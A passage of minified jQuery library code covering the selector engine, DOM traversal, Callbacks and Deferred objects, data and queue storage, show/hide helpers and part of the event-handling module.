        return ye.prototype = n.filters = n.pseudos, n.setFilters = new ye, s = ae.tokenize = function(e, t) {
            var i, o, r, s, a, l, c, u = S[e + " "];
            if (u) return t ? 0 : u.slice(0);
            for (a = e, l = [], c = n.preFilter; a;) {
                for (s in i && !(o = F.exec(a)) || (o && (a = a.slice(o[0].length) || a), l.push(r = [])), i = !1, (o = V.exec(a)) && (i = o.shift(), r.push({
                        value: i,
                        type: o[0].replace(R, " ")
                    }), a = a.slice(i.length)), n.filter) !(o = Y[s].exec(a)) || c[s] && !(o = c[s](o)) || (i = o.shift(), r.push({
                    value: i,
                    type: s,
                    matches: o
                }), a = a.slice(i.length));
                if (!i) break
            }
            return t ? a.length : a ? ae.error(e) : S(e, l).slice(0)
        }, a = ae.compile = function(e, t) {
            var i, o = [],
                r = [],
                a = A[e + " "];
            if (!a) {
                for (t || (t = s(e)), i = t.length; i--;)(a = Te(t[i]))[w] ? o.push(a) : r.push(a);
                a = A(e, function(e, t) {
                    var i = t.length > 0,
                        o = e.length > 0,
                        r = function(r, s, a, l, u) {
                            var d, h, g, m = 0,
                                y = "0",
                                b = r && [],
                                w = [],
                                x = c,
                                C = r || o && n.find.TAG("*", u),
                                T = k += null == x ? 1 : Math.random() || .1,
                                S = C.length;
                            for (u && (c = s == f || s || u); y !== S && null != (d = C[y]); y++) {
                                if (o && d) {
                                    for (h = 0, s || d.ownerDocument == f || (p(d), a = !v); g = e[h++];)
                                        if (g(d, s || f, a)) {
                                            l.push(d);
                                            break
                                        } u && (k = T)
                                }
                                i && ((d = !g && d) && m--, r && b.push(d))
                            }
                            if (m += y, i && y !== m) {
                                for (h = 0; g = t[h++];) g(b, w, s, a);
                                if (r) {
                                    if (m > 0)
                                        for (; y--;) b[y] || w[y] || (w[y] = D.call(l));
                                    w = ke(w)
                                }
                                j.apply(l, w), u && !r && w.length > 0 && m + t.length > 1 && ae.uniqueSort(l)
                            }
                            return u && (k = T, c = x), b
                        };
                    return i ? ce(r) : r
                }(r, o)), a.selector = e
            }
            return a
        }, l = ae.select = function(e, t, i, o) {
            var r, l, c, u, d, p = "function" == typeof e && e,
                f = !o && s(e = p.selector || e);
            if (i = i || [], 1 === f.length) {
                if ((l = f[0] = f[0].slice(0)).length > 2 && "ID" === (c = l[0]).type && 9 === t.nodeType && v && n.relative[l[1].type]) {
                    if (!(t = (n.find.ID(c.matches[0].replace(te, ie), t) || [])[0])) return i;
                    p && (t = t.parentNode), e = e.slice(l.shift().value.length)
                }
                for (r = Y.needsContext.test(e) ? 0 : l.length; r-- && (c = l[r], !n.relative[u = c.type]);)
                    if ((d = n.find[u]) && (o = d(c.matches[0].replace(te, ie), ee.test(l[0].type) && me(t.parentNode) || t))) {
                        if (l.splice(r, 1), !(e = o.length && be(l))) return j.apply(i, o), i;
                        break
                    }
            }
            return (p || a(e, f))(o, t, !v, i, !t || ee.test(e) && me(t.parentNode) || t), i
        }, i.sortStable = w.split("").sort(E).join("") === w, i.detectDuplicates = !!d, p(), i.sortDetached = ue((function(e) {
            return 1 & e.compareDocumentPosition(f.createElement("fieldset"))
        })), ue((function(e) {
            return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
        })) || de("type|href|height|width", (function(e, t, i) {
            if (!i) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
        })), i.attributes && ue((function(e) {
            return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
        })) || de("value", (function(e, t, i) {
            if (!i && "input" === e.nodeName.toLowerCase()) return e.defaultValue
        })), ue((function(e) {
            return null == e.getAttribute("disabled")
        })) || de(H, (function(e, t, i) {
            var n;
            if (!i) return !0 === e[t] ? t.toLowerCase() : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
        })), ae
    }(e);
    x.find = C, x.expr = C.selectors, x.expr[":"] = x.expr.pseudos, x.uniqueSort = x.unique = C.uniqueSort, x.text = C.getText, x.isXMLDoc = C.isXML, x.contains = C.contains, x.escapeSelector = C.escape;
    var T = function(e, t, i) {
            for (var n = [], o = void 0 !== i;
                (e = e[t]) && 9 !== e.nodeType;)
                if (1 === e.nodeType) {
                    if (o && x(e).is(i)) break;
                    n.push(e)
                } return n
        },
        S = function(e, t) {
            for (var i = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && i.push(e);
            return i
        },
        A = x.expr.match.needsContext;

    function $(e, t) {
        return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
    }
    var E = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;

    function P(e, t, i) {
        return h(t) ? x.grep(e, (function(e, n) {
            return !!t.call(e, n, e) !== i
        })) : t.nodeType ? x.grep(e, (function(e) {
            return e === t !== i
        })) : "string" != typeof t ? x.grep(e, (function(e) {
            return a.call(t, e) > -1 !== i
        })) : x.filter(t, e, i)
    }
    x.filter = function(e, t, i) {
        var n = t[0];
        return i && (e = ":not(" + e + ")"), 1 === t.length && 1 === n.nodeType ? x.find.matchesSelector(n, e) ? [n] : [] : x.find.matches(e, x.grep(t, (function(e) {
            return 1 === e.nodeType
        })))
    }, x.fn.extend({
        find: function(e) {
            var t, i, n = this.length,
                o = this;
            if ("string" != typeof e) return this.pushStack(x(e).filter((function() {
                for (t = 0; t < n; t++)
                    if (x.contains(o[t], this)) return !0
            })));
            for (i = this.pushStack([]), t = 0; t < n; t++) x.find(e, o[t], i);
            return n > 1 ? x.uniqueSort(i) : i
        },
        filter: function(e) {
            return this.pushStack(P(this, e || [], !1))
        },
        not: function(e) {
            return this.pushStack(P(this, e || [], !0))
        },
        is: function(e) {
            return !!P(this, "string" == typeof e && A.test(e) ? x(e) : e || [], !1).length
        }
    });
    var O, D = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
    (x.fn.init = function(e, t, i) {
        var n, o;
        if (!e) return this;
        if (i = i || O, "string" == typeof e) {
            if (!(n = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : D.exec(e)) || !n[1] && t) return !t || t.jquery ? (t || i).find(e) : this.constructor(t).find(e);
            if (n[1]) {
                if (t = t instanceof x ? t[0] : t, x.merge(this, x.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : g, !0)), E.test(n[1]) && x.isPlainObject(t))
                    for (n in t) h(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
                return this
            }
            return (o = g.getElementById(n[2])) && (this[0] = o, this.length = 1), this
        }
        return e.nodeType ? (this[0] = e, this.length = 1, this) : h(e) ? void 0 !== i.ready ? i.ready(e) : e(x) : x.makeArray(e, this)
    }).prototype = x.fn, O = x(g);
    var M = /^(?:parents|prev(?:Until|All))/,
        j = {
            children: !0,
            contents: !0,
            next: !0,
            prev: !0
        };

    function q(e, t) {
        for (;
            (e = e[t]) && 1 !== e.nodeType;);
        return e
    }
    x.fn.extend({
        has: function(e) {
            var t = x(e, this),
                i = t.length;
            return this.filter((function() {
                for (var e = 0; e < i; e++)
                    if (x.contains(this, t[e])) return !0
            }))
        },
        closest: function(e, t) {
            var i, n = 0,
                o = this.length,
                r = [],
                s = "string" != typeof e && x(e);
            if (!A.test(e))
                for (; n < o; n++)
                    for (i = this[n]; i && i !== t; i = i.parentNode)
                        if (i.nodeType < 11 && (s ? s.index(i) > -1 : 1 === i.nodeType && x.find.matchesSelector(i, e))) {
                            r.push(i);
                            break
                        } return this.pushStack(r.length > 1 ? x.uniqueSort(r) : r)
        },
        index: function(e) {
            return e ? "string" == typeof e ? a.call(x(e), this[0]) : a.call(this, e.jquery ? e[0] : e) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
        },
        add: function(e, t) {
            return this.pushStack(x.uniqueSort(x.merge(this.get(), x(e, t))))
        },
        addBack: function(e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
        }
    }), x.each({
        parent: function(e) {
            var t = e.parentNode;
            return t && 11 !== t.nodeType ? t : null
        },
        parents: function(e) {
            return T(e, "parentNode")
        },
        parentsUntil: function(e, t, i) {
            return T(e, "parentNode", i)
        },
        next: function(e) {
            return q(e, "nextSibling")
        },
        prev: function(e) {
            return q(e, "previousSibling")
        },
        nextAll: function(e) {
            return T(e, "nextSibling")
        },
        prevAll: function(e) {
            return T(e, "previousSibling")
        },
        nextUntil: function(e, t, i) {
            return T(e, "nextSibling", i)
        },
        prevUntil: function(e, t, i) {
            return T(e, "previousSibling", i)
        },
        siblings: function(e) {
            return S((e.parentNode || {}).firstChild, e)
        },
        children: function(e) {
            return S(e.firstChild)
        },
        contents: function(e) {
            return null != e.contentDocument && n(e.contentDocument) ? e.contentDocument : ($(e, "template") && (e = e.content || e), x.merge([], e.childNodes))
        }
    }, (function(e, t) {
        x.fn[e] = function(i, n) {
            var o = x.map(this, t, i);
            return "Until" !== e.slice(-5) && (n = i), n && "string" == typeof n && (o = x.filter(n, o)), this.length > 1 && (j[e] || x.uniqueSort(o), M.test(e) && o.reverse()), this.pushStack(o)
        }
    }));
    var L = /[^\x20\t\r\n\f]+/g;

    function H(e) {
        return e
    }

    function N(e) {
        throw e
    }

    function I(e, t, i, n) {
        var o;
        try {
            e && h(o = e.promise) ? o.call(e).done(t).fail(i) : e && h(o = e.then) ? o.call(e, t, i) : t.apply(void 0, [e].slice(n))
        } catch (e) {
            i.apply(void 0, [e])
        }
    }
    x.Callbacks = function(e) {
        e = "string" == typeof e ? function(e) {
            var t = {};
            return x.each(e.match(L) || [], (function(e, i) {
                t[i] = !0
            })), t
        }(e) : x.extend({}, e);
        var t, i, n, o, r = [],
            s = [],
            a = -1,
            l = function() {
                for (o = o || e.once, n = t = !0; s.length; a = -1)
                    for (i = s.shift(); ++a < r.length;) !1 === r[a].apply(i[0], i[1]) && e.stopOnFalse && (a = r.length, i = !1);
                e.memory || (i = !1), t = !1, o && (r = i ? [] : "")
            },
            c = {
                add: function() {
                    return r && (i && !t && (a = r.length - 1, s.push(i)), function t(i) {
                        x.each(i, (function(i, n) {
                            h(n) ? e.unique && c.has(n) || r.push(n) : n && n.length && "string" !== b(n) && t(n)
                        }))
                    }(arguments), i && !t && l()), this
                },
                remove: function() {
                    return x.each(arguments, (function(e, t) {
                        for (var i;
                            (i = x.inArray(t, r, i)) > -1;) r.splice(i, 1), i <= a && a--
                    })), this
                },
                has: function(e) {
                    return e ? x.inArray(e, r) > -1 : r.length > 0
                },
                empty: function() {
                    return r && (r = []), this
                },
                disable: function() {
                    return o = s = [], r = i = "", this
                },
                disabled: function() {
                    return !r
                },
                lock: function() {
                    return o = s = [], i || t || (r = i = ""), this
                },
                locked: function() {
                    return !!o
                },
                fireWith: function(e, i) {
                    return o || (i = [e, (i = i || []).slice ? i.slice() : i], s.push(i), t || l()), this
                },
                fire: function() {
                    return c.fireWith(this, arguments), this
                },
                fired: function() {
                    return !!n
                }
            };
        return c
    }, x.extend({
        Deferred: function(t) {
            var i = [
                    ["notify", "progress", x.Callbacks("memory"), x.Callbacks("memory"), 2],
                    ["resolve", "done", x.Callbacks("once memory"), x.Callbacks("once memory"), 0, "resolved"],
                    ["reject", "fail", x.Callbacks("once memory"), x.Callbacks("once memory"), 1, "rejected"]
                ],
                n = "pending",
                o = {
                    state: function() {
                        return n
                    },
                    always: function() {
                        return r.done(arguments).fail(arguments), this
                    },
                    catch: function(e) {
                        return o.then(null, e)
                    },
                    pipe: function() {
                        var e = arguments;
                        return x.Deferred((function(t) {
                            x.each(i, (function(i, n) {
                                var o = h(e[n[4]]) && e[n[4]];
                                r[n[1]]((function() {
                                    var e = o && o.apply(this, arguments);
                                    e && h(e.promise) ? e.promise().progress(t.notify).done(t.resolve).fail(t.reject) : t[n[0] + "With"](this, o ? [e] : arguments)
                                }))
                            })), e = null
                        })).promise()
                    },
                    then: function(t, n, o) {
                        var r = 0;

                        function s(t, i, n, o) {
                            return function() {
                                var a = this,
                                    l = arguments,
                                    c = function() {
                                        var e, c;
                                        if (!(t < r)) {
                                            if ((e = n.apply(a, l)) === i.promise()) throw new TypeError("Thenable self-resolution");
                                            c = e && ("object" == typeof e || "function" == typeof e) && e.then, h(c) ? o ? c.call(e, s(r, i, H, o), s(r, i, N, o)) : (r++, c.call(e, s(r, i, H, o), s(r, i, N, o), s(r, i, H, i.notifyWith))) : (n !== H && (a = void 0, l = [e]), (o || i.resolveWith)(a, l))
                                        }
                                    },
                                    u = o ? c : function() {
                                        try {
                                            c()
                                        } catch (e) {
                                            x.Deferred.exceptionHook && x.Deferred.exceptionHook(e, u.stackTrace), t + 1 >= r && (n !== N && (a = void 0, l = [e]), i.rejectWith(a, l))
                                        }
                                    };
                                t ? u() : (x.Deferred.getStackHook && (u.stackTrace = x.Deferred.getStackHook()), e.setTimeout(u))
                            }
                        }
                        return x.Deferred((function(e) {
                            i[0][3].add(s(0, e, h(o) ? o : H, e.notifyWith)), i[1][3].add(s(0, e, h(t) ? t : H)), i[2][3].add(s(0, e, h(n) ? n : N))
                        })).promise()
                    },
                    promise: function(e) {
                        return null != e ? x.extend(e, o) : o
                    }
                },
                r = {};
            return x.each(i, (function(e, t) {
                var s = t[2],
                    a = t[5];
                o[t[1]] = s.add, a && s.add((function() {
                    n = a
                }), i[3 - e][2].disable, i[3 - e][3].disable, i[0][2].lock, i[0][3].lock), s.add(t[3].fire), r[t[0]] = function() {
                    return r[t[0] + "With"](this === r ? void 0 : this, arguments), this
                }, r[t[0] + "With"] = s.fireWith
            })), o.promise(r), t && t.call(r, r), r
        },
        when: function(e) {
            var t = arguments.length,
                i = t,
                n = Array(i),
                r = o.call(arguments),
                s = x.Deferred(),
                a = function(e) {
                    return function(i) {
                        n[e] = this, r[e] = arguments.length > 1 ? o.call(arguments) : i, --t || s.resolveWith(n, r)
                    }
                };
            if (t <= 1 && (I(e, s.done(a(i)).resolve, s.reject, !t), "pending" === s.state() || h(r[i] && r[i].then))) return s.then();
            for (; i--;) I(r[i], a(i), s.reject);
            return s.promise()
        }
    });
    var z = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
    x.Deferred.exceptionHook = function(t, i) {
        e.console && e.console.warn && t && z.test(t.name) && e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, i)
    }, x.readyException = function(t) {
        e.setTimeout((function() {
            throw t
        }))
    };
    var _ = x.Deferred();

    function W() {
        g.removeEventListener("DOMContentLoaded", W), e.removeEventListener("load", W), x.ready()
    }
    x.fn.ready = function(e) {
        return _.then(e).catch((function(e) {
            x.readyException(e)
        })), this
    }, x.extend({
        isReady: !1,
        readyWait: 1,
        ready: function(e) {
            (!0 === e ? --x.readyWait : x.isReady) || (x.isReady = !0, !0 !== e && --x.readyWait > 0 || _.resolveWith(g, [x]))
        }
    }), x.ready.then = _.then, "complete" === g.readyState || "loading" !== g.readyState && !g.documentElement.doScroll ? e.setTimeout(x.ready) : (g.addEventListener("DOMContentLoaded", W), e.addEventListener("load", W));
    var R = function(e, t, i, n, o, r, s) {
            var a = 0,
                l = e.length,
                c = null == i;
            if ("object" === b(i))
                for (a in o = !0, i) R(e, t, a, i[a], !0, r, s);
            else if (void 0 !== n && (o = !0, h(n) || (s = !0), c && (s ? (t.call(e, n), t = null) : (c = t, t = function(e, t, i) {
                    return c.call(x(e), i)
                })), t))
                for (; a < l; a++) t(e[a], i, s ? n : n.call(e[a], a, t(e[a], i)));
            return o ? e : c ? t.call(e) : l ? t(e[0], i) : r
        },
        F = /^-ms-/,
        V = /-([a-z])/g;

    function X(e, t) {
        return t.toUpperCase()
    }

    function B(e) {
        return e.replace(F, "ms-").replace(V, X)
    }
    var Q = function(e) {
        return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType
    };

    function Y() {
        this.expando = x.expando + Y.uid++
    }
    Y.uid = 1, Y.prototype = {
        cache: function(e) {
            var t = e[this.expando];
            return t || (t = {}, Q(e) && (e.nodeType ? e[this.expando] = t : Object.defineProperty(e, this.expando, {
                value: t,
                configurable: !0
            }))), t
        },
        set: function(e, t, i) {
            var n, o = this.cache(e);
            if ("string" == typeof t) o[B(t)] = i;
            else
                for (n in t) o[B(n)] = t[n];
            return o
        },
        get: function(e, t) {
            return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][B(t)]
        },
        access: function(e, t, i) {
            return void 0 === t || t && "string" == typeof t && void 0 === i ? this.get(e, t) : (this.set(e, t, i), void 0 !== i ? i : t)
        },
        remove: function(e, t) {
            var i, n = e[this.expando];
            if (void 0 !== n) {
                if (void 0 !== t) {
                    i = (t = Array.isArray(t) ? t.map(B) : (t = B(t)) in n ? [t] : t.match(L) || []).length;
                    for (; i--;) delete n[t[i]]
                }(void 0 === t || x.isEmptyObject(n)) && (e.nodeType ? e[this.expando] = void 0 : delete e[this.expando])
            }
        },
        hasData: function(e) {
            var t = e[this.expando];
            return void 0 !== t && !x.isEmptyObject(t)
        }
    };
    var U = new Y,
        G = new Y,
        Z = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        J = /[A-Z]/g;

    function K(e, t, i) {
        var n;
        if (void 0 === i && 1 === e.nodeType)
            if (n = "data-" + t.replace(J, "-$&").toLowerCase(), "string" == typeof(i = e.getAttribute(n))) {
                try {
                    i = function(e) {
                        return "true" === e || "false" !== e && ("null" === e ? null : e === +e + "" ? +e : Z.test(e) ? JSON.parse(e) : e)
                    }(i)
                } catch (e) {}
                G.set(e, t, i)
            } else i = void 0;
        return i
    }
    x.extend({
        hasData: function(e) {
            return G.hasData(e) || U.hasData(e)
        },
        data: function(e, t, i) {
            return G.access(e, t, i)
        },
        removeData: function(e, t) {
            G.remove(e, t)
        },
        _data: function(e, t, i) {
            return U.access(e, t, i)
        },
        _removeData: function(e, t) {
            U.remove(e, t)
        }
    }), x.fn.extend({
        data: function(e, t) {
            var i, n, o, r = this[0],
                s = r && r.attributes;
            if (void 0 === e) {
                if (this.length && (o = G.get(r), 1 === r.nodeType && !U.get(r, "hasDataAttrs"))) {
                    for (i = s.length; i--;) s[i] && 0 === (n = s[i].name).indexOf("data-") && (n = B(n.slice(5)), K(r, n, o[n]));
                    U.set(r, "hasDataAttrs", !0)
                }
                return o
            }
            return "object" == typeof e ? this.each((function() {
                G.set(this, e)
            })) : R(this, (function(t) {
                var i;
                if (r && void 0 === t) return void 0 !== (i = G.get(r, e)) || void 0 !== (i = K(r, e)) ? i : void 0;
                this.each((function() {
                    G.set(this, e, t)
                }))
            }), null, t, arguments.length > 1, null, !0)
        },
        removeData: function(e) {
            return this.each((function() {
                G.remove(this, e)
            }))
        }
    }), x.extend({
        queue: function(e, t, i) {
            var n;
            if (e) return t = (t || "fx") + "queue", n = U.get(e, t), i && (!n || Array.isArray(i) ? n = U.access(e, t, x.makeArray(i)) : n.push(i)), n || []
        },
        dequeue: function(e, t) {
            t = t || "fx";
            var i = x.queue(e, t),
                n = i.length,
                o = i.shift(),
                r = x._queueHooks(e, t);
            "inprogress" === o && (o = i.shift(), n--), o && ("fx" === t && i.unshift("inprogress"), delete r.stop, o.call(e, (function() {
                x.dequeue(e, t)
            }), r)), !n && r && r.empty.fire()
        },
        _queueHooks: function(e, t) {
            var i = t + "queueHooks";
            return U.get(e, i) || U.access(e, i, {
                empty: x.Callbacks("once memory").add((function() {
                    U.remove(e, [t + "queue", i])
                }))
            })
        }
    }), x.fn.extend({
        queue: function(e, t) {
            var i = 2;
            return "string" != typeof e && (t = e, e = "fx", i--), arguments.length < i ? x.queue(this[0], e) : void 0 === t ? this : this.each((function() {
                var i = x.queue(this, e, t);
                x._queueHooks(this, e), "fx" === e && "inprogress" !== i[0] && x.dequeue(this, e)
            }))
        },
        dequeue: function(e) {
            return this.each((function() {
                x.dequeue(this, e)
            }))
        },
        clearQueue: function(e) {
            return this.queue(e || "fx", [])
        },
        promise: function(e, t) {
            var i, n = 1,
                o = x.Deferred(),
                r = this,
                s = this.length,
                a = function() {
                    --n || o.resolveWith(r, [r])
                };
            for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; s--;)(i = U.get(r[s], e + "queueHooks")) && i.empty && (n++, i.empty.add(a));
            return a(), o.promise(t)
        }
    });
    var ee = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        te = new RegExp("^(?:([+-])=|)(" + ee + ")([a-z%]*)$", "i"),
        ie = ["Top", "Right", "Bottom", "Left"],
        ne = g.documentElement,
        oe = function(e) {
            return x.contains(e.ownerDocument, e)
        },
        re = {
            composed: !0
        };
    ne.getRootNode && (oe = function(e) {
        return x.contains(e.ownerDocument, e) || e.getRootNode(re) === e.ownerDocument
    });
    var se = function(e, t) {
        return "none" === (e = t || e).style.display || "" === e.style.display && oe(e) && "none" === x.css(e, "display")
    };

    function ae(e, t, i, n) {
        var o, r, s = 20,
            a = n ? function() {
                return n.cur()
            } : function() {
                return x.css(e, t, "")
            },
            l = a(),
            c = i && i[3] || (x.cssNumber[t] ? "" : "px"),
            u = e.nodeType && (x.cssNumber[t] || "px" !== c && +l) && te.exec(x.css(e, t));
        if (u && u[3] !== c) {
            for (l /= 2, c = c || u[3], u = +l || 1; s--;) x.style(e, t, u + c), (1 - r) * (1 - (r = a() / l || .5)) <= 0 && (s = 0), u /= r;
            u *= 2, x.style(e, t, u + c), i = i || []
        }
        return i && (u = +u || +l || 0, o = i[1] ? u + (i[1] + 1) * i[2] : +i[2], n && (n.unit = c, n.start = u, n.end = o)), o
    }
    var le = {};

    function ce(e) {
        var t, i = e.ownerDocument,
            n = e.nodeName,
            o = le[n];
        return o || (t = i.body.appendChild(i.createElement(n)), o = x.css(t, "display"), t.parentNode.removeChild(t), "none" === o && (o = "block"), le[n] = o, o)
    }

    function ue(e, t) {
        for (var i, n, o = [], r = 0, s = e.length; r < s; r++)(n = e[r]).style && (i = n.style.display, t ? ("none" === i && (o[r] = U.get(n, "display") || null, o[r] || (n.style.display = "")), "" === n.style.display && se(n) && (o[r] = ce(n))) : "none" !== i && (o[r] = "none", U.set(n, "display", i)));
        for (r = 0; r < s; r++) null != o[r] && (e[r].style.display = o[r]);
        return e
    }
    x.fn.extend({
        show: function() {
            return ue(this, !0)
        },
        hide: function() {
            return ue(this)
        },
        toggle: function(e) {
            return "boolean" == typeof e ? e ? this.show() : this.hide() : this.each((function() {
                se(this) ? x(this).show() : x(this).hide()
            }))
        }
    });
    var de, pe, fe = /^(?:checkbox|radio)$/i,
        he = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
        ve = /^$|^module$|\/(?:java|ecma)script/i;
    de = g.createDocumentFragment().appendChild(g.createElement("div")), (pe = g.createElement("input")).setAttribute("type", "radio"), pe.setAttribute("checked", "checked"), pe.setAttribute("name", "t"), de.appendChild(pe), f.checkClone = de.cloneNode(!0).cloneNode(!0).lastChild.checked, de.innerHTML = "<textarea>x</textarea>", f.noCloneChecked = !!de.cloneNode(!0).lastChild.defaultValue, de.innerHTML = "<option></option>", f.option = !!de.lastChild;
    var ge = {
        thead: [1, "<table>", "</table>"],
        col: [2, "<table><colgroup>", "</colgroup></table>"],
        tr: [2, "<table><tbody>", "</tbody></table>"],
        td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
        _default: [0, "", ""]
    };

    function me(e, t) {
        var i;
        return i = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : [], void 0 === t || t && $(e, t) ? x.merge([e], i) : i
    }

    function ye(e, t) {
        for (var i = 0, n = e.length; i < n; i++) U.set(e[i], "globalEval", !t || U.get(t[i], "globalEval"))
    }
    ge.tbody = ge.tfoot = ge.colgroup = ge.caption = ge.thead, ge.th = ge.td, f.option || (ge.optgroup = ge.option = [1, "<select multiple='multiple'>", "</select>"]);
    var be = /<|&#?\w+;/;

    function we(e, t, i, n, o) {
        for (var r, s, a, l, c, u, d = t.createDocumentFragment(), p = [], f = 0, h = e.length; f < h; f++)
            if ((r = e[f]) || 0 === r)
                if ("object" === b(r)) x.merge(p, r.nodeType ? [r] : r);
                else if (be.test(r)) {
            for (s = s || d.appendChild(t.createElement("div")), a = (he.exec(r) || ["", ""])[1].toLowerCase(), l = ge[a] || ge._default, s.innerHTML = l[1] + x.htmlPrefilter(r) + l[2], u = l[0]; u--;) s = s.lastChild;
            x.merge(p, s.childNodes), (s = d.firstChild).textContent = ""
        } else p.push(t.createTextNode(r));
        for (d.textContent = "", f = 0; r = p[f++];)
            if (n && x.inArray(r, n) > -1) o && o.push(r);
            else if (c = oe(r), s = me(d.appendChild(r), "script"), c && ye(s), i)
            for (u = 0; r = s[u++];) ve.test(r.type || "") && i.push(r);
        return d
    }
    var xe = /^([^.]*)(?:\.(.+)|)/;

    function ke() {
        return !0
    }

    function Ce() {
        return !1
    }

    function Te(e, t) {
        return e === function() {
            try {
                return g.activeElement
            } catch (e) {}
        }() == ("focus" === t)
    }

    function Se(e, t, i, n, o, r) {
        var s, a;
        if ("object" == typeof t) {
            for (a in "string" != typeof i && (n = n || i, i = void 0), t) Se(e, a, i, n, t[a], r);
            return e
        }
        if (null == n && null == o ? (o = i, n = i = void 0) : null == o && ("string" == typeof i ? (o = n, n = void 0) : (o = n, n = i, i = void 0)), !1 === o) o = Ce;
        else if (!o) return e;
        return 1 === r && (s = o, o = function(e) {
            return x().off(e), s.apply(this, arguments)
        }, o.guid = s.guid || (s.guid = x.guid++)), e.each((function() {
            x.event.add(this, t, o, n, i)
        }))
    }

    function Ae(e, t, i) {
        i ? (U.set(e, t, !1), x.event.add(e, t, {
            namespace: !1,
            handler: function(e) {
                var n, r, s = U.get(this, t);
                if (1 & e.isTrigger && this[t]) {
                    if (s.length)(x.event.special[t] || {}).delegateType && e.stopPropagation();
                    else if (s = o.call(arguments), U.set(this, t, s), n = i(this, t), this[t](), s !== (r = U.get(this, t)) || n ? U.set(this, t, !1) : r = {}, s !== r) return e.stopImmediatePropagation(), e.preventDefault(), r && r.value
                } else s.length && (U.set(this, t, {
                    value: x.event.trigger(x.extend(s[0], x.Event.prototype), s.slice(1), this)
                }), e.stopImmediatePropagation())
            }
        })) : void 0 === U.get(e, t) && x.event.add(e, t, ke)
    }
    x.event = {
        global: {},
        add: function(e, t, i, n, o) {
            var r, s, a, l, c, u, d, p, f, h, v, g = U.get(e);
            if (Q(e))
                for (i.handler && (i = (r = i).handler, o = r.selector), o && x.find.matchesSelector(ne, o), i.guid || (i.guid = x.guid++), (l = g.events) || (l = g.events = Object.create(null)), (s = g.handle) || (s = g.handle = function(t) {
                        return void 0 !== x && x.event.triggered !== t.type ? x.event.dispatch.apply(e, arguments) : void 0
                    }), c = (t = (t || "").match(L) || [""]).length; c--;) f = v = (a = xe.exec(t[c]) || [])[1], h = (a[2] || "").split(".").sort(), f && (d = x.event.special[f] || {}, f = (o ? d.delegateType : d.bindType) || f, d = x.event.special[f] || {}, u = x.extend({
                    type: f,
                    origType: v,
                    data: n,
                    handler: i,
                    guid: i.guid,
                    selector: o,
                    needsContext: o && x.expr.match.needsContext.test(o),
                    namespace: h.join(".")
                }, r), (p = l[f]) || ((p = l[f] = []).delegateCount = 0, d.setup && !1 !== d.setup.call(e, n, h, s) || e.addEventListener && e.addEventListener(f, s)), d.add && (d.add.call(e, u), u.handler.guid || (u.handler.guid = i.guid)), o ? p.splice(p.delegateCount++, 0, u) : p.push(u), x.event.global[f] = !0)
        },
        remove: function(e, t, i, n, o) {
            var r, s, a, l, c, u, d, p, f, h, v, g = U.hasData(e) && U.get(e);
            if (g && (l = g.events)) {
                for (c = (t = (t || "").match(L) || [""]).length; c--;)
                    if (f = v = (a = xe.exec(t[c]) || [])[1], h = (a[2] || "").split(".").sort(), f) {
                        for (d = x.event.special[f] || {}, p = l[f = (n ? d.delegateType : d.bindType) || f] || [], a = a[2] && new RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), s = r = p.length; r--;) u = p[r], !o && v !== u.origType || i && i.guid !== u.guid || a && !a.test(u.namespace) || n && n !== u.selector && ("**" !== n || !u.selector) || (p.splice(r, 1), u.selector && p.delegateCount--, d.remove && d.remove.call(e, u));
                        s && !p.length && (d.teardown && !1 !== d.teardown.call(e, h, g.handle) || x.removeEvent(e, f, g.handle), delete l[f])
                    } else
                        for (f in l) x.event.remove(e, f + t[c], i, n, !0);
                x.isEmptyObject(l) && U.remove(e, "handle events")
            }
        },
        dispatch: function(e) {
            var t, i, n, o, r, s, a = new Array(arguments.length),
                l = x.event.fix(e),
                c = (U.get(this, "events") || Object.create(null))[l.type] || [],
                u = x.event.special[l.type] || {};
            for (a[0] = l, t = 1; t < arguments.length; t++) a[t] = arguments[t];
            if (l.delegateTarget = this, !u.preDispatch || !1 !== u.preDispatch.call(this, l)) {
                for (s = x.event.handlers.call(this, l, c), t = 0;
                    (o = s[t++]) && !l.isPropagationStopped();)
                    for (l.currentTarget = o.elem, i = 0;
                        (r = o.handlers[i++]) && !l.isImmediatePropagationStopped();) l.rnamespace && !1 !== r.namespace && !l.rnamespace.test(r.namespace) || (l.handleObj = r, l.data = r.data, void 0 !== (n = ((x.event.special[r.origType] || {}).handle || r.handler).apply(o.elem, a)) && !1 === (l.result = n) && (l.preventDefault(), l.stopPropagation()));
                return u.postDispatch && u.postDispatch.call(this, l), l.result
            }
        },
        handlers: function(e, t) {
            var i, n, o, r, s, a = [],
                l = t.delegateCount,
                c = e.target;
            if (l && c.nodeType && !("click" === e.type && e.button >= 1))
                for (; c !== this; c = c.parentNode || this)
                    if (1 === c.nodeType && ("click" !== e.type || !0 !== c.disabled)) {
                        for (r = [], s = {}, i = 0; i < l; i++) void 0 === s[o = (n = t[i]).selector + " "] && (s[o] = n.needsContext ? x(o, this).index(c) > -1 : x.find(o, this, null, [c]).length), s[o] && r.push(n);
